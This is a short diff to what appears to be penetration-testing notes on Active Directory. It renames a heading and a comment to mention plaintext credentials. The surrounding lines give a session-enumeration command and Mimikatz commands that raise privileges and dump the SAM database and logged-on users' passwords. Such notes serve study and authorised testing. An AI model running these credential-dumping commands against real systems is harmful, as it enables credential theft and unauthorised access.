@@ -85,7 +85,7 @@ PS> Get-NetSession -ComputerName [domain_controller] # enum active user sessions
 
 ## AD Authentication
 
-### Dumping NTLM Hashes
+### Dumping NTLM Hashes and Plaintext Credentials
 
 NTLM authentication uses a challenge-response model, where a nonce/challenge encrypted using the user's NTLM hash is validated by the Domain Controller.
 
@@ -97,7 +97,7 @@ Dumping LM/NTLM hashes with Mimikatz
 mimikatz > privilege::debug
 mimikatz > token::elevate
 
-# dump creds
+# dump NTLM hashes + plaintext creds
 mimikatz > lsadump::sam              # dump contents of SAM db in current host
 mimikatz > sekurlsa::logonpasswords  # dump creds of logged-on users
 ```
